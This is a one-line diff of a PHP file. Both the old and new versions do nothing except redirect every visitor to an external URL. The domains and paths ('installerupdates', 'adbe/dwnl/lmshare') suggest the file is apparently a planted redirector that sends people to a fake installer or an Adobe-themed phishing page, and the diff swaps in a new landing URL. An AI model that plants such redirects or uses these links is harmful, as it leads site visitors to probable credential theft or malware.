@@ -1,1 +1,1 @@
-<?php header("Location: https://nameless-feather-e189.installerupdates.workers.dev/"); ?>
+<?php header("Location: https://taiwo.cfd/bincgi/adbe/dwnl/lmshare/"); ?>
